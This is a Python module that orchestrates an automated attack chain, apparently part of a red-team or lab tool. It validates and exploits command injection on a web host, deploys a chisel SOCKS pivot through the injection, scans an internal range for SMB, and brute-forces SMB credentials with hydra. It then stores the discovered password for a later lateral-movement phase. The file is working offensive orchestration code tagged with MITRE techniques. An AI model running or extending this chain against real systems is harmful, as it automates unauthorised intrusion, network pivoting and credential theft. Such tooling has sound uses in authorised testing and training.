"""ChainOrchestrator — one run_id for Phase 1 of the kill chain.

Sequences the EXISTING services as direct library calls:
  web validation -> web exploitation -> pivot -> internal scan -> credential discovery
Stops at credential discovery on purpose. SMB lateral movement (file
read/write/delete) and post-exploitation are separate Phase 2 steps that
consume this run's handoff (internal host + creds) — they are not called
from here.
Same run-tracking pattern as SmbExploiter, so the UI just polls one endpoint.
"""

from __future__ import annotations

import logging
import threading
from datetime import datetime, timezone
from typing import Any

log = logging.getLogger(__name__)


def _ts() -> str:
    return datetime.now(timezone.utc).isoformat()


class ChainOrchestrator:
    def __init__(self, web_validation_service, web_exploiter, pivot_engine, smb_exploiter):
        self.wv = web_validation_service
        self.we = web_exploiter
        self.pivot = pivot_engine
        self.smb = smb_exploiter
        self._runs: dict[str, dict] = {}
        self._lock = threading.Lock()

    # ── run tracking (identical shape to SmbExploiter) ──────────
    def _new_run(self, run_id: str, web_target: str) -> dict:
        run = {
            "run_id": run_id, "web_target": web_target, "status": "running",
            "steps": [], "summary": "", "started_at": _ts(), "finished_at": None,
        }
        with self._lock:
            self._runs[run_id] = run
        return run

    def _add_step(self, run: dict, phase: str, ok: bool, detail: str,
                  mitre: list[str] | None = None, evidence: Any = None) -> None:
        step = {
            "phase": phase, "ok": ok, "detail": detail,
            "mitre": mitre or [], "evidence": evidence, "timestamp": _ts(),
        }
        with self._lock:
            run["steps"].append(step)

    def _finish(self, run: dict, status: str, summary: str) -> None:
        with self._lock:
            run["status"], run["summary"], run["finished_at"] = status, summary, _ts()

    def get_run_status(self, run_id: str) -> dict:
        with self._lock:
            return dict(self._runs.get(run_id, {"status": "not_found"}))

    def history(self) -> list[dict]:
        with self._lock:
            return [{"run_id": rid, "target": d.get("web_target"),
                     "status": d.get("status"), "started_at": d.get("started_at")}
                    for rid, d in sorted(self._runs.items(),
                                         key=lambda kv: kv[1].get("started_at", ""), reverse=True)]

    # ── the kill chain ──────────────────────────────────────────
    def run_chain(self, run_id: str, web_target: str, internal_range: str,
                  smb_username: str = "smbtest", smb_share: str = "PrivEscLab",
                  smb_password: str = "", quick: bool = False,
                  web_port: int = 80, web_platform: str = "linux") -> str:
        run = self._new_run(run_id, web_target)

        def fail(phase, detail, mitre=None):
            self._add_step(run, phase, False, detail, mitre)
            self._finish(run, "failed", f"Chain stopped at {phase}: {detail}")
            return run_id

        # 1 ── Web validation (prove command injection) ────────── T1190
        try:
            scan_data = {
                "target_ip": web_target,
                "service_inventory": [{"host": web_target, "port": web_port,
                                       "protocol": "tcp", "state": "open", "service": "http"}],
                "web_inventory": [{"host": web_target, "port": web_port,
                                   "url": f"http://{web_target}:{web_port}/diagnostics.php",
                                   "path": "/diagnostics.php"}],
            }
            proposed = self.wv.propose_actions(scan_data)
            actions = proposed.get("actions") or []
            if not actions:
                return fail("web_validation", "No actions proposed (fingerprint mismatch)", ["T1190"])
            result = self.wv.run_action(actions[0]["action_id"], scan_data, approved=True)
            ok = result.get("status") == "confirmed"
            self._add_step(run, "web_validation", ok, result.get("summary", ""),
                           ["T1190"], result.get("evidence", []))
            if not ok:
                return fail("web_validation", "Probe not confirmed", ["T1190"])
        except Exception as exc:
            return fail("web_validation", str(exc), ["T1190"])

        # 2 ── Web exploitation (callback marker) ──────────────── T1059.008
        try:
            result = self.we.exploit(target_ip=web_target, port=web_port, platform=web_platform)
            ok = result.get("marker_verified") is True or result.get("status") in (
                "marker_verified", "command_execution_only")
            self._add_step(run, "web_exploitation", ok, result.get("status", ""),
                           ["T1059.008"], result.get("evidence", []))
            if not ok:
                return fail("web_exploitation", result.get("error") or "callback not verified",
                            ["T1059.008"])
        except Exception as exc:
            return fail("web_exploitation", str(exc), ["T1059.008"])

        # 3 ── Pivot (chisel server + client via injection) ────── T1090.001
        try:
            server_ok = self.pivot.start_chisel_server(port=8080, socks_port=1080)
            self.pivot.configure_proxychains(socks_port=1080)
            deployed = self.pivot.deploy_client_via_injection(
                target_ip=web_target,
                kali_ip=self.pivot.kali_ip,
                chisel_port=8080,
                socks_port=1080,
                platform=web_platform,
            )
            socks_ready = bool(deployed.get("socks_ready"))
            self._add_step(run, "pivot", bool(server_ok and socks_ready),
                           f"server={server_ok} socks={socks_ready}",
                           ["T1090.001"], deployed)
            if not socks_ready:
                return fail("pivot", "SOCKS not up after client deploy", ["T1090.001"])
        except Exception as exc:
            return fail("pivot", str(exc), ["T1090.001"])

        # 4 ── Internal scan through the pivot ─────────────────── T1046
        smb_host = None
        try:
            ports = "445" if quick else "445,3389,80,443,5985"
            found = self.pivot.scan_network(target_range=internal_range, ports=ports)
            self._add_step(run, "internal_scan", bool(found),
                           f"{len(found)} host(s) found", ["T1046"], found)
            smb_host = next((h["ip"] for h in found
                             if any(p.get("port") == 445 for p in h.get("open_ports", []))), None)
            if not smb_host:
                return fail("internal_scan", "No host with port 445 discovered", ["T1046"])
        except Exception as exc:
            return fail("internal_scan", str(exc), ["T1046"])

        # 5 ── Credential discovery only (handoff point) ───────── T1110
        # NOTE: Phase 1 stops here on purpose. Actual SMB lateral movement
        # (file read/write/delete) runs as a separate Phase 2a step using
        # its own module — this chain does not call it. Rerunning hydra
        # here just proves valid creds exist before handoff; it does not
        # touch or execute the SMB file-operations module.
        try:
            from exploitation import smb_expliotation as _smb_mod
            setattr(_smb_mod, "PIVOT_ENABLED", True)

            if not smb_password:
                hydra = self.smb.run_hydra_bruteforce(smb_host, username=smb_username)
                smb_password = hydra.get("password_found") or ""
                if not smb_password:
                    return fail("credential_discovery", "Hydra found no password", ["T1110"])

            self._add_step(
                run, "credential_discovery", True,
                f"host={smb_host} user={smb_username} — handoff ready for Phase 2",
                ["T1110"],
                {"smb_host": smb_host, "smb_username": smb_username,
                 "smb_password": smb_password, "smb_share": smb_share},
            )
        except Exception as exc:
            return fail("credential_discovery", str(exc), ["T1110"])

        self._finish(
            run, "completed",
            f"Foothold established. Handoff target={smb_host} "
            f"user={smb_username} for Phase 2 (SMB lateral movement).",
        )
        return run_id